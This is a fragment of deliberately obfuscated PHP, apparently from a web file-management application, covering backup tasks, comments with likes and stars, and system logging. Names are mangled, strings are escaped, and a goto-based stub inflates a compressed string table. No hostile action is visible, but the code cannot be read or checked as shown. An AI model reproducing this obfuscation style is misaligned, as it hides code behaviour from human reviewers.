parent::listData($¬›äŒ˜, $¦û‹Õìğ, !0); } public function lastItem() { $‰Õµó¼ô = $this->listData(); return !empty($‰Õµó¼ô[0]) ? $‰Õµó¼ô[0] : null; } public function kill($ØË…¢õø) { $İöƒ²â… =& $_SERVER[•€áå–Õ]; $À¬”¿¯ƒ = $this->listData($ØË…¢õø); if (!$À¬”¿¯ƒ || empty($À¬”¿¯ƒ[$İöƒ²â…[42]])) { return !0; } Task::kill($İöƒ²â…[820]); Task::kill($İöƒ²â…[841]); Task::kill($İöƒ²â…[850]); $“½ƒü = $À¬”¿¯ƒ[$İöƒ²â…[42]]; $ş¼¾—ó‰ = TEMP_FILES . $İöƒ²â…[819] . $“½ƒü . $İöƒ²â…[18]; IO::remove($ş¼¾—ó‰, !1); return $this->remove($ØË…¢õø); } public function remove($„Ù©ª‚‡) { $¼³—ÍŒÜ = $this->listData($„Ù©ª‚‡); if (!$¼³—ÍŒÜ) { return !0; } return $this->backupRemove($¼³—ÍŒÜ); } private function backupRemove($ÎéèÂÇ) { parent::remove($ÎéèÂÇ[$_SERVER[•€áå–Õ][454]]); $×È´Û«Ş = $this->backupPath($ÎéèÂÇ); IO::remove($×È´Û«Ş, !1); return !0; } private function backupPath($ñ©ó©ãª) { $Ãä¢Ù£ƒ =& $_SERVER[•€áå–Õ]; $¢üÂ „ = $ñ©ó©ãª[$Ãä¢Ù£ƒ[42]]; $™ıõæ¸± = Model($Ãä¢Ù£ƒ[811])->get($Ãä¢Ù£ƒ[812]); $¹‹œ¬ó = substr(md5($Ãä¢Ù£ƒ[813] . $™ıõæ¸± . $¢üÂ „), 0, 8); return "\173\x69\157\x3a{$ñ©ó©ãª[$Ãä¢Ù£ƒ[792]]}\x7d\57\x64\x61\x74\x61\x62\x61\x73\145\57\x62\141\x63\153\165\x70\57" . $¢üÂ „ . $Ãä¢Ù£ƒ[21] . $¹‹œ¬ó; } public function start() { $ÜÁÀ›òæ =& $_SERVER[•€áå–Õ]; if ($GLOBALS[$ÜÁÀ›òæ[16]][$ÜÁÀ›òæ[101]][$ÜÁÀ›òæ[1919]] != $ÜÁÀ›òæ[100]) { return !0; } $…Ÿî÷´— = $this->config(); if (!$…Ÿî÷´— || $…Ÿî÷´—[$ÜÁÀ›òæ[1663]] != $ÜÁÀ›òæ[100]) { return !1; } $Ëëª†ÓÆ = $this->process(); foreach ($Ëëª†ÓÆ as $¸Ê¢û×) { if ($¸Ê¢û×) { return Task::restart($¸Ê¢û×[$ÜÁÀ›òæ[454]]); } } $ƒ‰”ñøÃ = new Backup(); $±‹¶Š† = $ƒ‰”ñøÃ->db(); if ($±‹¶Š†) { $±‹¶Š† = $ƒ‰”ñøÃ->dbFile(); if ($±‹¶Š† && $…Ÿî÷´—[$ÜÁÀ›òæ[795]] == $ÜÁÀ›òæ[224]) { $±‹¶Š† = $ƒ‰”ñøÃ->file(); } } Backup::set(array($ÜÁÀ›òæ[791] => 1, $ÜÁÀ›òæ[802] => time())); return !0; } public function process() { $ú•§º‹š =& $_SERVER[•€áå–Õ]; $ğë©Àòí = array($ú•§º‹š[798] => Task::get($ú•§º‹š[820]), $ú•§º‹š[803] => Task::get($ú•§º‹š[841]), $ú•§º‹š[226] => Task::get($ú•§º‹š[850])); $Ç±¢ŠŸÙ = !1; foreach ($ğë©Àòí as &$Ö×²İ) { if ($Ç±¢ŠŸÙ) { $Ö×²İ = !1; continue; } if ($Ö×²İ) { $ã¤¯¼Ô = intval(_get($Ö×²İ, $ú•§º‹š[1698], 0)); if (time() - $ã¤¯¼Ô > 7200) { Task::kill($Ö×²İ[$ú•§º‹š[454]]); $Ç±¢ŠŸÙ = !0; $Ö×²İ = !1; } } } return $ğë©Àòí; } public function restore() { $Œ…ó‡Üß =& $_SERVER[•€áå–Õ]; ActionCall($Œ…ó‡Üß[1101], !0, 1); ActionCall($Œ…ó‡Üß[1101], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\155\x65\156\164"; protected $tableMeta = array("\164\141\142\x6c\x65\116\141\x6d\145" => "\143\157\155\155\145\156\x74\x5f\155\x65\164\x61", "\x6d\145\164\141\106\x69\145\154\x64" => "\x63\x6f\155\155\x65\156\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($•„„ƒÔ„) { $°á•İô =& $_SERVER[•€áå–Õ]; if ($•„„ƒÔ„[$°á•İô[1920]]) { $´š•ï¼í = $this->where(array($°á•İô[1921] => $•„„ƒÔ„[$°á•İô[1920]]))->find(); if (!$´š•ï¼í || $´š•ï¼í[$°á•İô[190]] != $•„„ƒÔ„[$°á•İô[190]] || $´š•ï¼í[$°á•İô[549]] != $•„„ƒÔ„[$°á•İô[549]]) { return !1; } $this->where(array($°á•İô[1921] => $•„„ƒÔ„[$°á•İô[1920]]))->setAdd($°á•İô[1922], 1); } $•„„ƒÔ„[$°á•İô[1923]] = 0; $•„„ƒÔ„[$°á•İô[1922]] = 0; $•„„ƒÔ„[$°á•İô[791]] = 1; return $this->add($•„„ƒÔ„); } public function commentCount($–ö¯´èÑ, $àãË´Ì–, $õ¢ïÒøÂ = false) { $Ò¨× Á =& $_SERVER[•€áå–Õ]; if (!$–ö¯´èÑ) { return array(); } if (is_string($–ö¯´èÑ) || is_int($–ö¯´èÑ)) { $–ö¯´èÑ = array($–ö¯´èÑ); } $Ô¦Í‘²ø = array($Ò¨× Á[549], $Ò¨× Á[1924] => $Ò¨× Á[545]); $¤àúàØ¸ = array($Ò¨× Á[549] => array($Ò¨× Á[17], $–ö¯´èÑ), $Ò¨× Á[190] => $àãË´Ì–); if ($õ¢ïÒøÂ) { $¤àúàØ¸[$Ò¨× Á[1693]] = $õ¢ïÒøÂ; } $Üß¢àêÇ = $this->field($Ô¦Í‘²ø)->where($¤àúàØ¸)->group($Ò¨× Á[549])->select(); return array_to_keyvalue($Üß¢àêÇ, $Ò¨× Á[549], $Ò¨× Á[545]); } public function starTarget($¾ ’âÚß, $ÜÜ¿ïñí) { $§úùŞ†‹ =& $_SERVER[•€áå–Õ]; $¢ÒªäÉ = $¾ ’âÚß + self::TYPE_STAR_OFFSET; $¬Ğ—¢Â = array($§úùŞ†‹[1693] => USER_ID, $§úùŞ†‹[190] => $¢ÒªäÉ, $§úùŞ†‹[549] => $ÜÜ¿ïñí); $¿øºŸÜ = $this->where($¬Ğ—¢Â)->find(); if ($¿øºŸÜ) { return $this->where(array($§úùŞ†‹[454] => $¿øºŸÜ[$§úùŞ†‹[454]]))->delete(); } $ö…´¿‡ = array($§úùŞ†‹[1920] => 0, $§úùŞ†‹[1693] => USER_ID, $§úùŞ†‹[791] => 1, $§úùŞ†‹[795] => $§úùŞ†‹[22], $§úùŞ†‹[190] => $¢ÒªäÉ, $§úùŞ†‹[549] => $ÜÜ¿ïñí, $§úùŞ†‹[1923] => 0, $§úùŞ†‹[1922] => 0); return $this->add($ö…´¿‡); } public function starTargetCount($ŒìİãÍ, $ĞÕß‡¸Ë) { $îÎÂ”‹œ =& $_SERVER[•€áå–Õ]; $ÉĞş•ÕÌ = $ĞÕß‡¸Ë + self::TYPE_STAR_OFFSET; $¾Õ»ƒÃñ = $this->commentCount($ŒìİãÍ, $ÉĞş•ÕÌ); $×©“àõƒ = $this->commentCount($ŒìİãÍ, $ÉĞş•ÕÌ, USER_ID); return array($îÎÂ”‹œ[1925] => $¾Õ»ƒÃñ, $îÎÂ”‹œ[1926] => $×©“àõƒ); } public function starTargetUserList($˜¦û§Æ, $¬¥ÊœÙ) { $×ˆªêÜÆ =& $_SERVER[•€áå–Õ]; $»……íöĞ = $˜¦û§Æ + self::TYPE_STAR_OFFSET; $“ÔÒº²› = array($×ˆªêÜÆ[549] => $¬¥ÊœÙ, $×ˆªêÜÆ[190] => $»……íöĞ); $§±¢¥’ = $this->where($“ÔÒº²›)->count(); $üßÊ¥¹Ô = array($×ˆªêÜÆ[310] => $§±¢¥’, $×ˆªêÜÆ[1927] => array()); if (!$§±¢¥’) { return $üßÊ¥¹Ô; } $îğ”ãØ = $this->field($×ˆªêÜÆ[1693])->where($“ÔÒº²›)->limit(500)->select(); $îğ”ãØ = array_to_keyvalue($îğ”ãØ, $×ˆªêÜÆ[22], $×ˆªêÜÆ[1693]); $üßÊ¥¹Ô[$×ˆªêÜÆ[1927]] = Model($×ˆªêÜÆ[557])->userListInfo($îğ”ãØ); return $üßÊ¥¹Ô; } public function prasiseUserList($ïÃÆ•Ó) { $½ÉÇØÏŠ =& $_SERVER[•€áå–Õ]; $ˆÍò¶°£ = array($½ÉÇØÏŠ[1928] => $ïÃÆ•Ó); $ıõ¥ŸÙ‡ = $this->where($ˆÍò¶°£)->find(); $ÂÉ‹úÔî = _get($ıõ¥ŸÙ‡, $½ÉÇØÏŠ[1923], 0); $‚‡£¤æÉ = array($½ÉÇØÏŠ[310] => $ÂÉ‹úÔî, $½ÉÇØÏŠ[1927] => array()); if (!$ÂÉ‹úÔî) { return $‚‡£¤æÉ; } $óì¨Å‚¼ = Model($½ÉÇØÏŠ[1929])->field($½ÉÇØÏŠ[1693])->where($ˆÍò¶°£)->limit(500)->select(); $óì¨Å‚¼ = array_to_keyvalue($óì¨Å‚¼, $½ÉÇØÏŠ[22], $½ÉÇØÏŠ[1693]); $‚‡£¤æÉ[$½ÉÇØÏŠ[1927]] = Model($½ÉÇØÏŠ[557])->userListInfo($óì¨Å‚¼); return $‚‡£¤æÉ; } public function remove($àÍĞ¨‘Ï) { $–ş‡³‰Õ =& $_SERVER[•€áå–Õ]; $ä…ĞŸı¡ = array($–ş‡³‰Õ[1921] => $àÍĞ¨‘Ï); $ä“³¾Ä = $this->where($ä…ĞŸı¡)->find(); if ($ä“³¾Ä[$–ş‡³‰Õ[1920]]) { $this->where(array($–ş‡³‰Õ[1921] => $ä“³¾Ä[$–ş‡³‰Õ[1920]]))->setAdd($–ş‡³‰Õ[1922], -1); } return $this->where($ä…ĞŸı¡)->delete(); } public function edit($¯ãèˆâÎ, $‰¯çŠ‘Â) { $ äıÛ¼Ê =& $_SERVER[•€áå–Õ]; $¾äšÕùÈ = array($ äıÛ¼Ê[1921] => $¯ãèˆâÎ); return $this->where($¾äšÕùÈ)->save(array($ äıÛ¼Ê[1930] => $‰¯çŠ‘Â)); } public function prasise($»’¶·„) { $ëÑ…ôä =& $_SERVER[•€áå–Õ]; $ö˜³é±Š = Model($ëÑ…ôä[1931]); $©Œ¹øÃ˜ = array($ëÑ…ôä[1921] => $»’¶·„, $ëÑ…ôä[1684] => USER_ID); $¦ğÊ¾í³ = $ö˜³é±Š->where($©Œ¹øÃ˜)->find(); if (!$¦ğÊ¾í³) { $ö˜³é±Š->add($©Œ¹øÃ˜); $ª²Ñ«‚ = $this->where(array($ëÑ…ôä[1921] => $»’¶·„))->setAdd($ëÑ…ôä[1923], 1); } else { $ö˜³é±Š->where($©Œ¹øÃ˜)->delete(); $ª²Ñ«‚ = $this->where(array($ëÑ…ôä[1921] => $»’¶·„))->setAdd($ëÑ…ôä[1923], -1); } return $ª²Ñ«‚; } public function targetInfo($°æƒğÊ‰, $ŒâéÏî) { $ª³úŒÓß =& $_SERVER[•€áå–Õ]; $Ø–ã‹‰¿ = array($ª³úŒÓß[627] => $°æƒğÊ‰, $ª³úŒÓß[628] => $ŒâéÏî); $Àì¿àæ = $this->where($Ø–ã‹‰¿)->count(); $í¤ğ ÓÃ = "\122\111\107\x48\124\40\112\x4f\x49\116\40{$this->tablePrefix}\x63\x6f\155\x6d\x65\156\x74\137\160\162\x61\151\x73\145\x20\x73\x74\x61\x72\x20\x6f\156\40\x63\157\155\155\x65\156\x74\x2e\143\x6f\155\x6d\x65\x6e\164\111\104\40\75\x20\x73\x74\x61\x72\x2e\143\x6f\155\x6d\x65\156\164\111\x44"; $¶ËÏó‰ = $this->alias($ª³úŒÓß[409])->where($Ø–ã‹‰¿)->join($í¤ğ ÓÃ, $ª³úŒÓß[1932])->count(); $Î²ŒÚÔè = array($ª³úŒÓß[1933] => $Àì¿àæ, $ª³úŒÓß[1934] => $¶ËÏó‰); return $Î²ŒÚÔè; } public function listData($ü–Â×Ù¸) { $µ‚†ú†í =& $_SERVER[•€áå–Õ]; if (isset($ü–Â×Ù¸[$µ‚†ú†í[1935]])) { if ($ü–Â×Ù¸[$µ‚†ú†í[1935]]) { $ü–Â×Ù¸[$µ‚†ú†í[1928]] = array($µ‚†ú†í[1055], intval($ü–Â×Ù¸[$µ‚†ú†í[1935]])); } unset($ü–Â×Ù¸[$µ‚†ú†í[1935]]); } if (isset($ü–Â×Ù¸[$µ‚†ú†í[1936]])) { if ($ü–Â×Ù¸[$µ‚†ú†í[1936]]) { $ü–Â×Ù¸[$µ‚†ú†í[1928]] = array($µ‚†ú†í[1052], intval($ü–Â×Ù¸[$µ‚†ú†í[1936]])); } unset($ü–Â×Ù¸[$µ‚†ú†í[1936]]); } return $this->_listData($ü–Â×Ù¸); } private function _listData($ˆáéôøÏ) { $¢µ‹´À† =& $_SERVER[•€áå–Õ]; $”èÚ´âü = $this->where($ˆáéôøÏ)->_makeOrder()->selectPage(100); $this->_listAppendParent($”èÚ´âü[$¢µ‹´À†[424]]); $this->_listAppendUser($”èÚ´âü[$¢µ‹´À†[424]]); $this->_listAppendMeta($”èÚ´âü[$¢µ‹´À†[424]]); return $”èÚ´âü; } private function _makeOrder() { $ï©ßøÑ­ =& $_SERVER[•€áå–Õ]; $¾£¥†í = array($ï©ßøÑ­[1923], $ï©ßøÑ­[1922], $ï©ßøÑ­[227]); $¸…‘ï´© = Input::get($ï©ßøÑ­[509], $ï©ßøÑ­[17], $ï©ßøÑ­[476], $¾£¥†í); $ğî¼ôÌ¹ = Input::get($ï©ßøÑ­[510], $ï©ßøÑ­[17], $ï©ßøÑ­[1686], array($ï©ßøÑ­[1937], $ï©ßøÑ­[505])); $¤ÅÎñ—Û = $¸…‘ï´© . $ï©ßøÑ­[63] . $ğî¼ôÌ¹; return $this->order($¤ÅÎñ—Û); } private function _listAppendParent(&$Œãæ¶‹) { $Ù×ÓÕ‘ô =& $_SERVER[•€áå–Õ]; $¹…Ó»ƒ¸ = array_unique(array_to_keyvalue($Œãæ¶‹, $Ù×ÓÕ‘ô[22], $Ù×ÓÕ‘ô[1920])); $¹…Ó»ƒ¸ = array_remove_value($¹…Ó»ƒ¸, $Ù×ÓÕ‘ô[224]); if (!$¹…Ó»ƒ¸) { return; } $ˆ–“ÚÑ¸ = $this->where(array($Ù×ÓÕ‘ô[1921] => array($Ù×ÓÕ‘ô[17], $¹…Ó»ƒ¸)))->select(); $ˆ–“ÚÑ¸ = array_to_keyvalue($ˆ–“ÚÑ¸, $Ù×ÓÕ‘ô[1928]); foreach ($Œãæ¶‹ as &$—ª©”«²) { if (isset($ˆ–“ÚÑ¸[$—ª©”«²[$Ù×ÓÕ‘ô[1920]]])) { $—ª©”«²[$Ù×ÓÕ‘ô[1938]] = $ˆ–“ÚÑ¸[$—ª©”«²[$Ù×ÓÕ‘ô[1920]]]; } } unset($—ª©”«²); } private function _listAppendUser(&$ô—ê­Ü…) { $›ìà«ŒÌ =& $_SERVER[•€áå–Õ]; $™»•·Ã¼ = array_unique(array_to_keyvalue($ô—ê­Ü…, $›ìà«ŒÌ[22], $›ìà«ŒÌ[1693])); $™»•·Ã¼ = array_remove_value($™»•·Ã¼, $›ìà«ŒÌ[224]); if (count($™»•·Ã¼) == 0) { return; } foreach ($ô—ê­Ü… as $ÔñÛïÛ) { if (isset($ÔñÛïÛ[$›ìà«ŒÌ[1938]])) { $™»•·Ã¼[] = $ÔñÛïÛ[$›ìà«ŒÌ[1938]][$›ìà«ŒÌ[1693]]; } } $ Àæ¥”‡ = Model($›ìà«ŒÌ[578])->userListInfo($™»•·Ã¼); foreach ($ô—ê­Ü… as &$ÔñÛïÛ) { $ÔñÛïÛ[$›ìà«ŒÌ[641]] = $ Àæ¥”‡[$ÔñÛïÛ[$›ìà«ŒÌ[1693]]]; if (isset($ÔñÛïÛ[$›ìà«ŒÌ[1938]])) { $ÔñÛïÛ[$›ìà«ŒÌ[1938]][$›ìà«ŒÌ[641]] = $ Àæ¥”‡[$ÔñÛïÛ[$›ìà«ŒÌ[1938]][$›ìà«ŒÌ[1693]]]; } } unset($ÔñÛïÛ); } private function _listAppendMeta(&$Ôºî°‘ë) { $ñ‘ö ­¡ =& $_SERVER[•€áå–Õ]; $Æ©¿·Ú = array_unique(array_to_keyvalue($Ôºî°‘ë, $ñ‘ö ­¡[22], $ñ‘ö ­¡[1928])); $Æ©¿·Ú = array_remove_value($Æ©¿·Ú, $ñ‘ö ­¡[224]); if (!$Æ©¿·Ú) { return; } foreach ($Ôºî°‘ë as $¡Ì»¦ù) { if (isset($¡Ì»¦ù[$ñ‘ö ­¡[1938]])) { $Æ©¿·Ú[] = $¡Ì»¦ù[$ñ‘ö ­¡[1938]][$ñ‘ö ­¡[1928]]; } } $©û´€Â¤ = $this->metaList($Æ©¿·Ú); if (!$©û´€Â¤) { return !1; } foreach ($Ôºî°‘ë as &$¡Ì»¦ù) { $¡Ì»¦ù[$ñ‘ö ­¡[518]] = $©û´€Â¤[$¡Ì»¦ù[$ñ‘ö ­¡[1928]]]; if (isset($¡Ì»¦ù[$ñ‘ö ­¡[1938]])) { $¡Ì»¦ù[$ñ‘ö ­¡[1938]][$ñ‘ö ­¡[518]] = $©û´€Â¤[$¡Ì»¦ù[$ñ‘ö ­¡[1938]][$ñ‘ö ­¡[1928]]]; } } unset($¡Ì»¦ù); } private function metaList($æÒ²ÇÀ) { $„­Ã˜ïÅ =& $_SERVER[•€áå–Õ]; if (!$æÒ²ÇÀ) { return array(); } $„æû†¼± = array($„­Ã˜ïÅ[1928] => array($„­Ã˜ïÅ[17], $æÒ²ÇÀ)); $Ñƒ¾ä©ñ = Model($„­Ã˜ïÅ[1939])->where($„æû†¼±)->select(); $Ñƒ¾ä©ñ = array_to_keyvalue_group($Ñƒ¾ä©ñ, $„­Ã˜ïÅ[1928]); foreach ($Ñƒ¾ä©ñ as $Ç©–¶Ò™ => $§¥¼æƒ°) { $¼İ‹Åş = array(); foreach ($§¥¼æƒ° as $Ìé†±í·) { $¼İ‹Åş[$Ìé†±í·[$„­Ã˜ïÅ[106]]] = $Ìé†±í·[$„­Ã˜ïÅ[429]]; } $Ñƒ¾ä©ñ[$Ç©–¶Ò™] = $¼İ‹Åş; } return $Ñƒ¾ä©ñ ? $Ñƒ¾ä©ñ : array(); } } goto Aé§‡¯´›…; bÆåŒãÊÙ¼: $_SERVER[ÛóøÜ¾æ] = explode($_SERVER[•€áå–Õ][659], gzinflate(substr($_SERVER[•€áå–Õ][660], 10, -8))); $paekgjwmut = $_SERVER[•€áå–Õ][661]; while (strlen($paekgjwmut) < $_SERVER[•€áå–Õ][13]) { if (!$paekgjwmut) { break; } $paekgjwmut++; } goto Däï¬‘…²; cÌö¹°‰ÆĞ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\114\x69\x67\150\x74\x41\160\160"; public $modelType = "\123\x79\x73\164\145\155\117\160\x74\151\157\x6e"; public $field = array("\156\141\x6d\x65", "\x67\162\157\165\x70", "\144\145\163\143", "\x63\x6f\156\x74\x65\x6e\x74"); public function listData($æÚ±¤›ô = false, $éóëÂé° = "\155\157\x64\151\146\x79\x54\x69\155\x65", $¾¿–Êà– = true) { return parent::listData($æÚ±¤›ô, $éóëÂé°, $¾¿–Êà–); } public function remove($½…Çø«ø) { $ÎÅ«íÑ = $this->findByName($½…Çø«ø); if (!$ÎÅ«íÑ) { return !1; } return parent::remove($ÎÅ«íÑ[$_SERVER[•€áå–Õ][454]]); } public function add($¦ı¼·º…) { if ($this->findByName($¦ı¼·º…[$_SERVER[•€áå–Õ][42]])) { return !1; } return parent::insert($¦ı¼·º…); } public function update($§ĞªêÜƒ, $âÃ’Îƒµ) { $³˜’ŠŸ¥ =& $_SERVER[•€áå–Õ]; $…®Í“ = $this->findByName($§ĞªêÜƒ); $ôíí‡É  = $this->findByName($âÃ’Îƒµ[$³˜’ŠŸ¥[42]]); if (!$…®Í“ || $ôíí‡É  && $ôíí‡É [$³˜’ŠŸ¥[454]] != $…®Í“[$³˜’ŠŸ¥[454]]) { return !1; } return parent::update($…®Í“[$³˜’ŠŸ¥[454]], $âÃ’Îƒµ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\155\x5f\x6c\x6f\147"; protected $dataAuto = array(array("\x63\162\145\141\164\145\x54\151\x6d\x65", "\164\x69\155\x65", "\151\156\163\x65\x72\164", "\x66\165\x6e\x63\x74\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $­ê¥µÑ­ =& $_SERVER[•€áå–Õ]; return array($­ê¥µÑ­[2228] => LNG($­ê¥µÑ­[2229]), $­ê¥µÑ­[2230] => LNG($­ê¥µÑ­[2231]), $­ê¥µÑ­[1834] => LNG($­ê¥µÑ­[2232]), $­ê¥µÑ­[2233] => LNG($­ê¥µÑ­[2234]), $­ê¥µÑ­[2235] => LNG($­ê¥µÑ­[2236]), $­ê¥µÑ­[2237] => LNG($­ê¥µÑ­[2238]), $­ê¥µÑ­[2239] => LNG($­ê¥µÑ­[2240]), $­ê¥µÑ­[1864] => LNG($­ê¥µÑ­[2240]), $­ê¥µÑ­[1865] => LNG($­ê¥µÑ­[2241]), $­ê¥µÑ­[2242] => LNG($­ê¥µÑ­[2243]), $­ê¥µÑ­[2244] => LNG($­ê¥µÑ­[2245]), $­ê¥µÑ­[2246] => LNG($­ê¥µÑ­[2247]), $­ê¥µÑ­[2248] => LNG($­ê¥µÑ­[2249]), $­ê¥µÑ­[1862] => LNG($­ê¥µÑ­[2250]), $­ê¥µÑ­[2251] => LNG($­ê¥µÑ­[2252]), $­ê¥µÑ­[1869] => LNG($­ê¥µÑ­[2253]), $­ê¥µÑ­[2254] => LNG($­ê¥µÑ­[2255]), $­ê¥µÑ­[2256] => LNG($­ê¥µÑ­[2257]), $­ê¥µÑ­[2258] => LNG($­ê¥µÑ­[2259]), $­ê¥µÑ­[2260] => LNG($­ê¥µÑ­[2261]), $­ê¥µÑ­[1872] => LNG($­ê¥µÑ­[2262]), $­ê¥µÑ­[1873] => LNG($­ê¥µÑ­[2263]), $­ê¥µÑ­[2264] => LNG($­ê¥µÑ­[2265]), $­ê¥µÑ­[2266] => LNG($­ê¥µÑ­[2267]), $­ê¥µÑ­[2268] => LNG($­ê¥µÑ­[2269]), $­ê¥µÑ­[1867] => LNG($­ê¥µÑ­[2270]), $­ê¥µÑ­[2271] => LNG($­ê¥µÑ­[2272]), $­ê¥µÑ­[1866] => LNG($­ê¥µÑ­[2273]), $­ê¥µÑ­[2274] => LNG($­ê¥µÑ­[2275]), $­ê¥µÑ­[2276] => LNG($­ê¥µÑ­[2277]), $­ê¥µÑ­[2278] => LNG($­ê¥µÑ­[2279]), $­ê¥µÑ­[2280] => LNG($­ê¥µÑ­[2280]), $­ê¥µÑ­[2281] => LNG($­ê¥µÑ­[1838]), $­ê¥µÑ­[2282] => LNG($­ê¥µÑ­[2283]), $­ê¥µÑ­[2284] => LNG($­ê¥µÑ­[2285]), $­ê¥µÑ­[2286] => LNG($­ê¥µÑ­[2287]), $­ê¥µÑ­[2288] => LNG($­ê¥µÑ­[2289]), $­ê¥µÑ­[2290] => LNG($­ê¥µÑ­[2291]), $­ê¥µÑ­[2292] => LNG($­ê¥µÑ­[2292]), $­ê¥µÑ­[2293] => LNG($­ê¥µÑ­[2294]), $­ê¥µÑ­[2295] => LNG($­ê¥µÑ­[2296]), $­ê¥µÑ­[2297] => LNG($­ê¥µÑ­[2298]), $­ê¥µÑ­[2299] => LNG($­ê¥µÑ­[2300]), $­ê¥µÑ­[2301] => LNG($­ê¥µÑ­[2302]), $­ê¥µÑ­[2303] => LNG($­ê¥µÑ­[2304])); } private function typeFile() { $ÌÄ„óƒŠ =& $_SERVER[•€áå–Õ]; $¤÷ãÖæ = array($ÌÄ„óƒŠ[1869] => array($ÌÄ„óƒŠ[1870]), $ÌÄ„óƒŠ[2246] => array($ÌÄ„óƒŠ[2305]), $ÌÄ„óƒŠ[2248] => array($ÌÄ„óƒŠ[2306]), $ÌÄ„óƒŠ[1862] => array($ÌÄ„óƒŠ[1863], $ÌÄ„óƒŠ[2307]), $ÌÄ„óƒŠ[2256] => array(), $ÌÄ„óƒŠ[2258] => array(), $ÌÄ„óƒŠ[2260] => array(), $ÌÄ„óƒŠ[1872] => array($ÌÄ„óƒŠ[1874]), $ÌÄ„óƒŠ[1873] => array($ÌÄ„óƒŠ[1874]), $ÌÄ„óƒŠ[2264] => array($ÌÄ„óƒŠ[2308]), $ÌÄ„óƒŠ[2266] => array($ÌÄ„óƒŠ[2308]), $ÌÄ„óƒŠ[2268] => array($ÌÄ„óƒŠ[2309]), $ÌÄ„óƒŠ[2254] => array($ÌÄ„óƒŠ[2310]), $ÌÄ„óƒŠ[1867] => array($ÌÄ„óƒŠ[2311]), $ÌÄ„óƒŠ[2271] => array($ÌÄ„óƒŠ[2312]), $ÌÄ„óƒŠ[1866] => array($ÌÄ„óƒŠ[1868])); return $¤÷ãÖæ; } private function typeAll() { $®½±¿áÔ =& $_SERVER[•€áå–Õ]; $Ÿãñ¢Ã¡ = $this->typeList; $ü¡Ä¬è× = array_filter($this->typeFile()); foreach ($ü¡Ä¬è× as $Ó´­çì => $è‡£ê†À) { $Ÿãñ¢Ã¡[$è‡£ê†À[0]] = $Ÿãñ¢Ã¡[$Ó´­çì]; } $Ÿãñ¢Ã¡[$®½±¿áÔ[1874]] = LNG($®½±¿áÔ[2313]); $Ÿãñ¢Ã¡[$®½±¿áÔ[2308]] = LNG($®½±¿áÔ[2314]); return $Ÿãñ¢Ã¡; } public function addLog($ÄõëÙÀ˜, $«àõˆ˜ = array()) { $åÚ„óĞÈ =& $_SERVER[•€áå–Õ]; if (!isset($this->typeList[$ÄõëÙÀ˜])) { return; } $ ¨éº„¸ = isset($«àõˆ˜[$åÚ„óĞÈ[1693]]) ? $«àõˆ˜[$åÚ„óĞÈ[1693]] : 0; if (!$ ¨éº„¸) { $ ¨éº„¸ = Session::get($åÚ„óĞÈ[2028]); } if ($ÄõëÙÀ˜ == $åÚ„óĞÈ[2282] && is_array($«àõˆ˜[$åÚ„óĞÈ[2315]]) && !$«àõˆ˜[$åÚ„óĞÈ[2315]]) { return; } $©“İëÁ¡ = get_client_ip(); if (!$«àõˆ˜ || strlen(json_encode($«àõˆ˜)) >= 1024) { $«àõˆ˜ = array($åÚ„óĞÈ[2316] => $©“İëÁ¡); } else { if (is_array($«àõˆ˜)) { $«àõˆ˜[$åÚ„óĞÈ[2316]] = $©“İëÁ¡; } else { $«àõˆ˜ = array($åÚ„óĞÈ[1243] => $«àõˆ˜, $åÚ„óĞÈ[2316] => $©“İëÁ¡); } } $«àõˆ˜ = array($åÚ„óĞÈ[1683] => Session::sign(), $åÚ„óĞÈ[1684] => intval($ ¨éº„¸), $åÚ„óĞÈ[43] => $ÄõëÙÀ˜, $åÚ„óĞÈ[1686] => json_encode($«àõˆ˜)); parent::add($«àõˆ˜); } public function remove($¹›÷ğ‘ö) { $this->where(array($_SERVER[•€áå–Õ][472] => $¹›÷ğ‘ö))->delete(); } private function _makeOrder($æä©’®ò = '') { $ß®ÇÆÒ =& $_SERVER[•€áå–Õ]; $—ÅçË°Á = $ß®ÇÆÒ[227]; $àÙÑïª– = array($ß®ÇÆÒ[502] => $ß®ÇÆÒ[503], $ß®ÇÆÒ[504] => $ß®ÇÆÒ[505]); $¨É…ŒŸ = Input::get($ß®ÇÆÒ[510], $ß®ÇÆÒ[17], $ß®ÇÆÒ[2064], array($ß®ÇÆÒ[1982], $ß®ÇÆÒ[504])); $¨É…ŒŸ = $àÙÑïª–[$¨É…ŒŸ]; $æä©’®ò = $æä©’®ò . "{$—ÅçË°Á}\40{$¨É…ŒŸ}"; return $this->order($æä©’®ò); } public function get($ÎÅÛ…¼ = '') { $¶â¬ˆİ¬ =& $_SERVER[•€áå–Õ]; if (!$ÎÅÛ…¼) { show_json(array()); } $ğŠ²óñ = array(); if ($ÎÅÛ…¼[$¶â¬ˆİ¬[1693]]) { $ğŠ²óñ[$¶â¬ˆİ¬[1693]] = $ÎÅÛ…¼[$¶â¬ˆİ¬[1693]]; } if (isset($ÎÅÛ…¼[$¶â¬ˆİ¬[801]])) { $ø÷–õ‹ = $ÎÅÛ…¼[$¶â¬ˆİ¬[801]]; $á´É˜¼ú = isset($ÎÅÛ…¼[$¶â¬ˆİ¬[802]]) ? $ÎÅÛ…¼[$¶â¬ˆİ¬[802]] : time(); $ğŠ²óñ[$¶â¬ˆİ¬[227]] = array($¶â¬ˆİ¬[388], array($ø÷–õ‹, $á´É˜¼ú)); } if ($ÎÅÛ…¼[$¶â¬ˆİ¬[43]]) { $âø™ºëü = explode($¶â¬ˆİ¬[60], $ÎÅÛ…¼[$¶â¬ˆİ¬[43]]); $’Ö³ê£ï = $this->typeFile(); $Ä—½§ƒ“ = array(); foreach ($âø™ºëü as $ãÑƒÅª) { $Ä—½§ƒ“[] = $ãÑƒÅª; if (isset($’Ö³ê£ï[$ãÑƒÅª])) { $Ä—½§ƒ“ = array_merge($Ä—½§ƒ“, $’Ö³ê£ï[$ãÑƒÅª]); } } $Ä—½§ƒ“ = array_unique($Ä—½§ƒ“); if ($Ä—½§ƒ“) { 